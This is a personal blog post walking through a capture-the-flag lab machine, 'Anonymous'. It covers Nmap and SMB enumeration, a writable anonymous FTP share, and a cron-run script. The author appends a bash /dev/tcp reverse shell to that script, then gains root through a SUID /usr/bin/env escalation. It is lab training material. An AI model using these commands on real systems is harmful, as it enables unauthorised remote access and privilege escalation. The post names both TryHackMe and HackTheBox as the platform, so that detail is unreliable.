<!DOCTYPE html>

<!--
  portfolYOU Jekyll theme by yousinix
  Free for personal and commercial use under the MIT license
  https://github.com/yousinix/portfolYOU
-->

<html lang="en" class="h-100">

<head>

  
  
  

  

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:type" content="website">
  <meta property="og:title" content="Anonymous">
  <meta property="og:description" content="Tryhackme - Medium">
  <meta property="og:image" content="/assets/img/profile.png">

  <title>Anonymous</title>
  <meta name="description" content="Tryhackme - Medium">

  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">

  <!-- Theme style -->
  <script src="/assets/js/theme.js"></script>

  <!-- Font Awesome CDN -->
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">

  <!-- Bootstrap CSS CDN -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">

  <!-- Animate CSS CDN -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">

  <!-- Custom CSS -->
  <link rel="stylesheet" href="/assets/css/style.css">

</head>


<body class="h-100 d-flex flex-column">

  <main class="flex-shrink-0 container mt-5">
    <nav class="navbar navbar-expand-lg navbar-themed">

  <a class="navbar-brand" href="/"><h5><b>Akshay Chavan</b></h5></a>

  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
    <i class="fas fa-1x fa-bars text-themed"></i>
  </button>

  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
    <div class="navbar-nav ml-auto">
<a class="nav-item nav-link " href="/projects/">Projects</a>

      <a class="nav-item nav-link active" href="/blog/">Blog</a>

      <a class="nav-item nav-link " href="/about/">About</a>

      

      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
    </div>
  </div>

</nav>
    <div class="col-lg-10 mx-auto mt-5 markdown-body">
  <h1><b>Anonymous</b></h1>

<p class="post-metadata text-muted">
  21 January 2024 -  
  <b>4 mins read time</b>

  <br>Tags: 
    
    <a class="text-decoration-none no-underline" href="/blog/tags#networksecurity">
      <span class="tag badge badge-pill text-primary border border-primary">NetworkSecurity</span>
    </a>
    
    <a class="text-decoration-none no-underline" href="/blog/tags#ftpexploitation">
      <span class="tag badge badge-pill text-primary border border-primary">FTPExploitation</span>
    </a>
    
    <a class="text-decoration-none no-underline" href="/blog/tags#suid">
      <span class="tag badge badge-pill text-primary border border-primary">SUID</span>
    </a>
    </p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/876a5185c429c9703e625cb48c39637b.png" alt="infocard"></p>

<p>Anonymous is an easy machine on HackTheBox that involves exploiting writable FTP services and SUID misconfigurations to gain root access. This walkthrough will guide you through the process of compromising the Anonymous machine, from initial reconnaissance to gaining root access.</p>

<h2 id="reconnaissance">Reconnaissance</h2>

<p>The initial reconnaissance was performed using <strong>Nmap</strong>, revealing the following open services:</p>

<pre><code class="language-nmap">Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 09:36 EDT
Nmap scan report for 10.10.187.181
Host is up (0.16s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.133.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2021-10-07T13:36:24+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-07T13:36:24
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .


</code></pre>

<p>According to  <strong>Nmap</strong> the target machine is running <strong>FTP</strong>, <strong>SSH</strong>, and <strong>SMB</strong> services.</p>

<h3 id="smb-enumeration">SMB Enumeration</h3>

<p>Using <code class="language-plaintext highlighter-rouge">smbclient</code>, I enumerated the available shares:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> //<span class="nv">$ip</span>/
Enter WORKGROUP<span class="se">\k</span>ali<span class="s1">'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

</span></code></pre></div></div>

<p>The share <code class="language-plaintext highlighter-rouge">pics</code> was accessible and contained two image files:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //<span class="nv">$ip</span>/pics
Enter WORKGROUP<span class="se">\k</span>ali<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020

                20508240 blocks of size 1024. 13306816 blocks available

</span></code></pre></div></div>

<p>After downloading and analyzing the files for hidden data (steganography), no useful information was found. This turned out to be a rabbit hole.</p>

<h3 id="ftp-enumeration">FTP Enumeration</h3>

<p>The FTP server allows anonymous login and is writable. Listing its contents revealed a <code class="language-plaintext highlighter-rouge">scripts</code> folder containing several files:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000          946 Dec 02 14:44 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.

</code></pre></div></div>

<p>The file <code class="language-plaintext highlighter-rouge">clean.sh</code> appears to be executed periodically via a cron job. The script logic is as follows:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nv">tmp_files</span><span class="o">=</span>0
<span class="nb">echo</span> <span class="nv">$tmp_files</span>
<span class="k">if</span> <span class="o">[</span> <span class="nv">$tmp_files</span><span class="o">=</span>0 <span class="o">]</span>
<span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Running cleanup script:  nothing to delete"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files.log
<span class="k">else
    for </span>LINE <span class="k">in</span> <span class="nv">$tmp_files</span><span class="p">;</span> <span class="k">do
        </span><span class="nb">rm</span> <span class="nt">-rf</span> /tmp/<span class="nv">$LINE</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2"> | Removed file /tmp/</span><span class="nv">$LINE</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files.log<span class="p">;</span><span class="k">done
fi</span>

</code></pre></div></div>

<p>The script checks for files in the <code class="language-plaintext highlighter-rouge">/tmp</code> directory and removes them, logging the activity. Since the FTP server is writable, I modified this script to include a reverse shell.</p>

<h2 id="gaining-access">Gaining Access</h2>

<p>The FTP server was mounted using <code class="language-plaintext highlighter-rouge">curlftpfs</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curlftpfs anonymous@$ip mount/
</code></pre></div></div>

<p>Using <strong>vim</strong>, I added a bash reverse shell payload to <code class="language-plaintext highlighter-rouge">clean.sh</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -i &gt;&amp; /dev/tcp/ATTACKING-IP/80 0&gt;&amp;1
</code></pre></div></div>

<p>After waiting for the cron job to execute, I received a reverse shell as the user <code class="language-plaintext highlighter-rouge">namelessone</code>.</p>

<p><img src="/assets/ctf/anonymous1.png" alt="anonymous1"></p>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<h3 id="from-namelessone-to-root">From <code class="language-plaintext highlighter-rouge">namelessone</code> to <code class="language-plaintext highlighter-rouge">root</code>
</h3>

<p>During enumeration, I discovered that the SUID bit was set on <code class="language-plaintext highlighter-rouge">/usr/bin/env</code>. Exploiting this allowed privilege escalation to <code class="language-plaintext highlighter-rouge">root</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/env /bin/sh -p
</code></pre></div></div>
<p>Executing the above command granted root access:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>namelessone@anonymous:~<span class="nv">$ </span>/usr/bin/env /bin/sh <span class="nt">-p</span>
/usr/bin/env /bin/sh <span class="nt">-p</span>
<span class="nb">whoami
</span>root
</code></pre></div></div>

<h2 id="conclusion">Conclusion</h2>

<p>The <code class="language-plaintext highlighter-rouge">Anonymous</code> machine was compromised through a combination of enumeration, abuse of writable services, and exploitation of SUID misconfigurations.</p>

<hr>



</div>
  </main>
  <footer class="mt-auto py-3 text-center">

  <small class="text-muted mb-2">
    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
    by <strong>Akshay Chavan</strong>
  </small>

  <div class="container-fluid justify-content-center">
<a class="social mx-1" href="mailto:akschavan100@gmail.com" style="color: #6c757d" onmouseover="this.style.color='#db4437'" onmouseout="this.style.color='#6c757d'">
      <i class="fas fa-envelope fa-1x"></i>
    </a><a class="social mx-1" href="https://www.github.com/akshaychavan10" style="color: #6c757d" onmouseover="this.style.color='#333333'" onmouseout="this.style.color='#6c757d'">
      <i class="fab fa-github fa-1x"></i>
    </a><a class="social mx-1" href="https://www.linkedin.com/in/akshaychavan07" style="color: #6c757d" onmouseover="this.style.color='#007bb5'" onmouseout="this.style.color='#6c757d'">
      <i class="fab fa-linkedin-in fa-1x"></i>
    </a>

</div>
<small id="attribution">
    theme <a href="https://github.com/yousinix/portfolYOU">portfolYOU</a>
  </small>

</footer>

  
  <!-- GitHub Buttons -->
<script async defer src="https://buttons.github.io/buttons.js"></script>

<!-- jQuery CDN -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<!-- Popper.js CDN -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>

<!-- Bootstrap JS CDN -->
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>

<!-- wow.js CDN & Activation -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
<script> new WOW().init(); </script>

<!-- Initialize all tooltips -->
<script>
$(function () {
    $('[data-toggle="tooltip"]').tooltip()
})
</script>
</body>

</html>